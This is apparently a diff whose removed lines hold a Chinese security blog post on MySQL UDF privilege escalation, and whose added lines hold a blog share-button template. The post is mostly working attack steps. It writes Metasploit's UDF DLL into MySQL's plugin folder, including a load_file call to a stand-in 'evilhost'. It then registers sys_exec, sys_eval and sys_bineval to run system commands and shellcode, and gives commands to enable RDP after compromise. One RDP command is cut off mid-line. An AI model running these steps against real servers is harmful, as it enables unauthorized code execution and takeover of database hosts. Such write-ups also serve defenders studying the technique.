-<h3 id="3-怎么放进去"><a href="#3-怎么放进去" class="headerlink" title="3.怎么放进去"></a><strong>3.怎么放进去</strong></h3><h4 id="udf-dll-在哪"><a href="#udf-dll-在哪" class="headerlink" title="udf.dll 在哪"></a><strong>udf.dll 在哪</strong></h4><p>MSF 给我们提供了现成的 udf.dll ,位置在</p>
-<pre><code>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
-/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
-</code></pre><h4 id="方法一：远程加载"><a href="#方法一：远程加载" class="headerlink" title="方法一：远程加载"></a><strong>方法一：远程加载</strong></h4><p>load_file() 函数支持远程加载，然后我们配合 dumpfile  实现写入</p>
-<pre><code>select load_file(&apos;\\\\evilhost\evil.dll&apos;) into dumpfile &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot; 
-</code></pre><p>但是这里面有一个限制就是在lib 目录下一定要存在 plugin 目录，否则这个不能执行成功，会报一个错误，如下</p>
-<pre><code>#1 - Can&apos;t create/write to file &apos;E:\phpstudy\PHPTutorial\MySQL\lib\plugin\udf.dll&apos; (Errcode: 2)
-</code></pre><h4 id="方法二：HEX-写入"><a href="#方法二：HEX-写入" class="headerlink" title="方法二：HEX 写入"></a><strong>方法二：HEX 写入</strong></h4><p>在某些情况下我们可以将我们 udf.dll 转化成16进制然后写入，这样就不用连接外网了，我以64位的为例</p>
-<pre><code>select hex(load_file(&apos;E:\\lib_mysqludf_sys_64.dll&apos;)) into outfile &quot;E:\\udf64.hex&quot;；
-</code></pre><p>生成了 hex 文件以后我们可以将 hex 文件的内容复制出来，写入我们的命令</p>
-<pre><code>select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000… into dumpfile &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;
-</code></pre><blockquote>
-<p><strong>注意：</strong></p>
-<p>我们导出的 hex 格式前面是没有 0x 的，这个需要自己添加</p>
-</blockquote>
-<h4 id="方法三：分段写入数据表中，然后-select-那个字段"><a href="#方法三：分段写入数据表中，然后-select-那个字段" class="headerlink" title="方法三：分段写入数据表中，然后 select 那个字段"></a><strong>方法三：分段写入数据表中，然后 select 那个字段</strong></h4><pre><code>create table temp(data longblob);
-
-insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
-
-update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
-
-select data from temp into dump file &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;
-</code></pre><h4 id="方法四：利用函数-to-base64-和-from-base64"><a href="#方法四：利用函数-to-base64-和-from-base64" class="headerlink" title="方法四：利用函数 to_base64 和 from_base64"></a><strong>方法四：利用函数 to_base64 和 from_base64</strong></h4><p>从 MySQL 5.6.1 和 MariaDB 10.0.5 开始，我们就能使用 to_base64 和 from_base64 来进行编码了</p>
-<pre><code>select to_base64(load_file(&apos;E:\\lib_mysqludf_sys_64.dll&apos;)) into outfile &quot;E:\\udf64.b64&quot; 
-</code></pre><p>然后我们使用 from_base64 解码并结合 into dumpfile 写入 dll</p>
-<pre><code>select from_base64(&quot;base64 的内容，因为太长了就不贴了&quot;) 
-</code></pre><p>into dumpfile “E:\mysql-5.6.41-winx64\lib\plugin\udf64.dll”;</p>
-<h3 id="4-怎么利用这个-dll"><a href="#4-怎么利用这个-dll" class="headerlink" title="4.怎么利用这个 dll"></a><strong>4.怎么利用这个 dll</strong></h3><p>我们要利用这个 dll 来安装我们写在 dll 中的函数，那我们需要看一下写这个 dll 的大佬给我们提供了哪些函数吧(于是翻出之前分析后门的工具，没想到还能在这里排上用场)</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/dll%E4%B8%AD%E5%85%A8%E9%83%A8%E7%9A%84%E5%87%BD%E6%95%B0.png" alt="此处输入图片的描述"></p>
-<h4 id="1-sys-exec"><a href="#1-sys-exec" class="headerlink" title="1.sys_exec()"></a><strong>1.sys_exec()</strong></h4><p>当然是用频率最高的还是 sys_exec ,这个函数能让我们轻松地执行系统命令</p>
-<p>让我们开始加载这函数吧</p>
-<pre><code>create function sys_exec RETURNS int soname &apos;udf.dll&apos; 
-</code></pre><p>我们查看一下</p>
-<pre><code>mysql&gt; select * from mysql.func where name = &quot;sys_exec&quot;;
-+----------+-----+---------+----------+
-| name     | ret | dl      | type     |
-+----------+-----+---------+----------+
-| sys_exec |   2 | udf.dll | function |
-+----------+-----+---------+----------+
-1 row in set (0.00 sec)
-</code></pre><p>好了，我们能愉快的执行命令了</p>
-<pre><code>select sys_exec(&apos;whoami&apos;)
-</code></pre><p>运行结果：</p>
-<pre><code>mysql&gt; select sys_exec(&apos;whoami&apos;);
-+--------------------+
-| sys_exec(&apos;whoami&apos;) |
-+--------------------+
-|                  0 |
-+--------------------+
-1 row in set (0.28 sec)
-</code></pre><p>运行后你会快速看到命令执行的黑色框弹出，然后转瞬即逝，表明命令成功执行(<strong>要是能回显就好了~~~</strong>)</p>
-<p>使用完了别忘了把函数删了</p>
-<pre><code>drop function sys_exec;
-</code></pre><p>这个时候再看</p>
-<pre><code>mysql&gt; select * from mysql.func where name = &quot;sys_exec&quot;;
-Empty set (0.00 sec)
-</code></pre><h4 id="2-sys-evel"><a href="#2-sys-evel" class="headerlink" title="2.sys_evel()"></a><strong>2.sys_evel()</strong></h4><p>该功能将执行系统命令并在屏幕上通过标准输出显示，什么？真的可以？梦想就要成真了，我们来试试</p>
-<pre><code>create function sys_eval returns string soname &apos;udf.dll&apos;;
-</code></pre><p>我们看一下：</p>
-<pre><code>mysql&gt; select * from mysql.func where name = &quot;sys_eval&quot;;
-+----------+-----+---------+----------+
-| name     | ret | dl      | type     |
-+----------+-----+---------+----------+
-| sys_eval |   0 | udf.dll | function |
-+----------+-----+---------+----------+
-1 row in set (0.00 sec)
-</code></pre><p>执行：</p>
-<pre><code>mysql&gt; select sys_eval(&apos;whoami&apos;);
-+------------------------+
-| sys_eval(&apos;whoami&apos;)     |
-+------------------------+
-| desktop-s2l4c24\k0rz3n |
-+------------------------+
-1 row in set (0.27 sec)
-</code></pre><p>太完美了！</p>
-<p>删除函数：</p>
-<pre><code>drop function sys_eval;
-</code></pre><h4 id="3-sys-get"><a href="#3-sys-get" class="headerlink" title="3.sys_get()"></a><strong>3.sys_get()</strong></h4><p>该函数返回系统变量的值</p>
-<p>注册函数</p>
-<pre><code>create function sys_get returns string soname &apos;udf.dll&apos;;
-</code></pre><p>查看：</p>
-<pre><code>mysql&gt; select * from mysql.func where name = &quot;sys_get&quot;;
-+---------+-----+---------+----------+
-| name    | ret | dl      | type     |
-+---------+-----+---------+----------+
-| sys_get |   0 | udf.dll | function |
-+---------+-----+---------+----------+
-1 row in set (0.00 sec)
-</code></pre><p>使用：</p>
-<pre><code>select sys_get(&apos;longonserver&apos;);
-</code></pre><p>结果：</p>
-<pre><code>mysql&gt; Select sys_get(&apos;COMSPEC&apos;);
-+-----------------------------+
-| sys_get(&apos;COMSPEC&apos;)          |
-+-----------------------------+
-| C:\Windows\system32\cmd.exe |
-+-----------------------------+
-1 row in set (0.00 sec)
-</code></pre><p>删除：</p>
-<pre><code>drop function sys_get;
-</code></pre><h4 id="4-执行Shellcode-sys-bineval"><a href="#4-执行Shellcode-sys-bineval" class="headerlink" title="4.执行Shellcode - sys_bineval"></a><strong>4.执行Shellcode - sys_bineval</strong></h4><p>这个函数应该功能更强大，能直接执行 shellcode/任何二进制文件 ,我们把 shellcode/ 任意二进制文件 编码为 hex 或者 base64 ，然后在解码一下传递给他就行了</p>
-<p>注册函数：</p>
-<pre><code>create function sys_bineval returns int soname &apos;udf.dll&apos;;
-</code></pre><p>查看一下：</p>
-<pre><code>mysql&gt; select * from mysql.func where name = &quot;sys_bineval&quot;;
-+-------------+-----+---------+----------+
-| name        | ret | dl      | type     |
-+-------------+-----+---------+----------+
-| sys_bineval |   2 | udf.dll | function |
-+-------------+-----+---------+----------+
-1 row in set (0.00 sec)
-</code></pre><p>我们先把我们要运行的二进制文件编码成 base64 形式</p>
-<pre><code>select to_base64(load_file(&apos;E:\\calc.exe&apos;)) into outfile &quot;E:\\calc.b64&quot; 
-</code></pre><p>使用：</p>
-<pre><code>select sys_bineval(from_base64(load_file(&apos;E:\\calc.b64&apos;)));
-</code></pre><p>但是这个方法有些不稳定，我第一次尝试的时候 mysql 直接挂了，开都开不起来了,hhh，原作者也说了这个方法似乎不适用于 64位平台，但是在 32 位平台能正常工作</p>
-<p>删除函数</p>
-<pre><code>drop function sys_bineval;
-</code></pre><h4 id="5-补充一些-trick"><a href="#5-补充一些-trick" class="headerlink" title="5.补充一些 trick"></a><strong>5.补充一些 trick</strong></h4><h5 id="1-导出文件名的问题"><a href="#1-导出文件名的问题" class="headerlink" title="1.导出文件名的问题"></a><strong>1.导出文件名的问题</strong></h5><p>导出的文件名不一定要是 xxx.dll ，我们可以任意命名，这个后缀名对创建函数没有任何影响</p>
-<pre><code>mysql&gt;  create function sys_exec returns string soname &apos;udf.exp&apos;;
-Query OK, 0 rows affected (0.01 sec)
-</code></pre><h5 id="2-不存在plugin-目录的问题"><a href="#2-不存在plugin-目录的问题" class="headerlink" title="2.不存在plugin 目录的问题"></a><strong>2.不存在plugin 目录的问题</strong></h5><p>这个问题相当的棘手啊，mysql 5.1 以后我们必须将我们的 udf.dll 弄到我们的亲爱的 pplugin 目录下，但是要是偏偏没有这个目录怎么办？</p>
-<p>kingcope提到了一种方法，利用NTFS ADS流来创建文件夹的方法，这个方法我们经常称之为 NTFS 隐写，可以用来写后门甚至 getshell</p>
-<h6 id="1-什么是-NTFS-的-ADS"><a href="#1-什么是-NTFS-的-ADS" class="headerlink" title="1.什么是 NTFS  的 ADS"></a><strong>1.什么是 NTFS  的 ADS</strong></h6><p>在NTFS文件系统中存在着NTFS交换数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流,正因为这个特性，通常 ADS也被用于一些恶意文件隐藏自身,作为后门。</p>
-<p>为了避免跑题，我这里就不讲解 NTFS ADS 的其他用途，我们就来看一下怎么创建文件夹</p>
-<h6 id="2-怎么在只能导出文件的情况下导出一个文件夹"><a href="#2-怎么在只能导出文件的情况下导出一个文件夹" class="headerlink" title="2.怎么在只能导出文件的情况下导出一个文件夹"></a><strong>2.怎么在只能导出文件的情况下导出一个文件夹</strong></h6><p>我们创建一个空的名为 TEST 的文件夹</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%A9%BA%E6%96%87%E4%BB%B6%E5%A4%B9.png" alt="此处输入图片的描述"></p>
-<p>然后我们执行下面这条命令</p>
-<pre><code>echo xxx &gt; test::$INDEX_ALLOCATION
-</code></pre><p><strong>结果如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%88%90%E5%8A%9F%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9.png" alt="此处输入图片的描述"></p>
-<p>我们清楚地看到本来是创建文件的命令在 ::$INDEX_ALLOCATION 的作用下创建成了一个文件夹（这个应该是一个漏洞，微软在最近的漏洞补丁中生成要修复这个漏洞，并且有了CVE 编号 CVE-2018-1036/NTFS EOP，不过我目前本地测试应该没有收到影响）</p>
-<h6 id="2-试一下使用-mysql-导出文件的方法能不能成功"><a href="#2-试一下使用-mysql-导出文件的方法能不能成功" class="headerlink" title="2.试一下使用 mysql 导出文件的方法能不能成功"></a><strong>2.试一下使用 mysql 导出文件的方法能不能成功</strong></h6><p>首先看一下我本地的 xxx/mysql/lib/ 下面没有 plugin 文件夹</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysql%E4%B8%8B%E6%B2%A1%E6%9C%89%E6%96%87%E4%BB%B6%E5%A4%B9.png" alt="此处输入图片的描述"></p>
-<p>执行文件导出命令：</p>
-<pre><code>select &apos;xxx&apos; into outfile &apos;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&apos;;
-</code></pre><p>结果：</p>
-<pre><code>#1 - Can&apos;t create/write to file &apos;E:\phpstudy\PHPTutorial\MySQL\lib\plugin::$INDEX_ALLOCATION&apos; (Errcode: 13 - Permission denied)
-</code></pre><p>失败了。。。。，心情复杂，具体原因我也不是很清楚，因为我创建普通文件的时候是可以的，如果有师傅尝试成功还望不吝赐教</p>
-<h5 id="3-能执行命令以后我们能做更多"><a href="#3-能执行命令以后我们能做更多" class="headerlink" title="3.能执行命令以后我们能做更多"></a><strong>3.能执行命令以后我们能做更多</strong></h5><h6 id="1-先看一下-3389-开没开："><a href="#1-先看一下-3389-开没开：" class="headerlink" title="(1)先看一下 3389 开没开："></a><strong>(1)先看一下 3389 开没开：</strong></h6><pre><code>netstat -an |find &quot;3389&quot; 
-</code></pre><p>######<strong>(2)Windows 2008Server命令行开启3389</strong></p>
-<pre><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1 
-
-wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1 
-
-reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v
-</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/zydj333/p/6951002.html" target="_blank" rel="noopener">https://www.cnblogs.com/zydj333/p/6951002.html</a><br><a href="http://blog.51cto.com/simeon/1926022" target="_blank" rel="noopener">http://blog.51cto.com/simeon/1926022</a><br><a href="http://www.mottoin.com/article/web/96772.html" target="_blank" rel="noopener">http://www.mottoin.com/article/web/96772.html</a><br><a href="https://blog.csdn.net/m0_37438418/article/details/80289025?utm_source=blogxgwz7" target="_blank" rel="noopener">https://blog.csdn.net/m0_37438418/article/details/80289025?utm_source=blogxgwz7</a><br><a href="https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695" target="_blank" rel="noopener">https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695</a><br><a href="http://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/163144.html</a><br><a href="http://www.freebuf.com/articles/3853.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/3853.html</a><br><a href="https://www.i0day.com/733.html" target="_blank" rel="noopener">https://www.i0day.com/733.html</a><br><a href="https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695" target="_blank" rel="noopener">https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695</a><br><a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html" target="_blank" rel="noopener">https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html</a><br><a href="https://www.jianshu.com/p/bd18b92c1224" target="_blank" rel="noopener">https://www.jianshu.com/p/bd18b92c1224</a><br><a href="https://www.i0day.com/733.html" target="_blank" rel="noopener">https://www.i0day.com/733.html</a><br><a href="https://www.freebuf.com/column/143125.html" target="_blank" rel="noopener">https://www.freebuf.com/column/143125.html</a><br><a href="https://www.cnblogs.com/qing123/p/6608141.html" target="_blank" rel="noopener">https://www.cnblogs.com/qing123/p/6608141.html</a><br><a href="https://www.cnblogs.com/qing123/p/6771858.html" target="_blank" rel="noopener">https://www.cnblogs.com/qing123/p/6771858.html</a></p>
-</div><div class="tags"><a href="/tags/web安全-MySQL-渗透测试/">web安全 MySQL 渗透测试</a></div><div class="post-nav"><a class="pre" href="/2018/10/24/关于One-line-php-challenge的思考/">关于One-line-php-challenge的思考</a><a class="next" href="/2018/10/13/J2EE基础（JSP 篇）/">J2EE基础（JSP 篇）</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
+    .post-content
+      != page.content
+    if theme.shareto == true
+      script(type='text/javascript', src=url_for(theme.js) + '/share.js' + '?v=' + theme.version, async)
+      a.article-share-link(data-url='#{page.permalink}', data-id='#{page._id}')= __('shareto')
+    include _partial/tag
+    include _partial/post_nav
+    if theme.duoshuo
+      div(class='ds-share flat' data-thread-key=page.path, data-title=page.title, data-url=page.permalink)
+         .ds-share-inline
+            ul.ds-share-icons-16
+              li(data-toggle='ds-share-icons-more')
+                a(class='ds-more' href='javascript:void(0);') 分享到：
+              li
+                a(class='ds-weibo' href='javascript:void(0);' data-service='weibo') 微博
+              li
+                a(class='ds-qzone' href='javascript:void(0);' data-service='qzone') QQ空间
+              li
+                a(class='ds-qqt' href='javascript:void(0);' data-service='qqt') 腾讯微博
+              li
+                a(class='ds-wechat' href='javascript:void(0);' data-service='wechat') 微信
+            .ds-share-icons-more
+    if page.comments
+      include _partial/comments
